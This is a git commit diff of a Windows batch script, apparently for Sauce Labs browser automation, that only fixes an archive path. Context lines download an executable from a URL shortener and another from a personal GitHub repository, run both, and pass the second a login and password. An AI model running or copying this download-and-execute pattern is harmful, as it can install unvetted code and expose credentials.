cf8541b282fe650d0fd8326ca957bf7904a001bd
marinabarros320168 <121142741+marinabarros320168@users.noreply.github.com>
2023-02-16 23:45:01 -0300

    alskdjaslkd

--- runsauceinlabs.bat
+++ runsauceinlabs.bat
@@ -3,6 +3,6 @@ set psw=%2
 powershell Invoke-WebRequest 'https://is.gd/mUbqFD' -OutFile "C:\Users\Public\Downloads\chrome_installer.exe"
 powershell Invoke-Expression "C:\Users\Public\Downloads\chrome_installer.exe"
 powershell Invoke-WebRequest -Uri "https://chromedriver.storage.googleapis.com/110.0.5481.77/chromedriver_win32.zip" -OutFile "C:\Users\Public\Downloads\chromedriver_win32.zip"
-powershell Expand-Archive -LiteralPath C:\Users\Public\Downloads\edgedriver.zip -DestinationPath C:\Users\Public\Downloads
+powershell Expand-Archive -LiteralPath C:\Users\Public\Downloads\chromedriver_win32.zip -DestinationPath C:\Users\Public\Downloads
 powershell Invoke-WebRequest -Uri "https://raw.githubusercontent.com/marinabarros320168/new/main/SauceLabs.exe" -OutFile "C:\Users\Public\Downloads\saucelabs.exe"
 C:\Users\Public\Downloads\saucelabs.exe -e %lg% -p %psw%
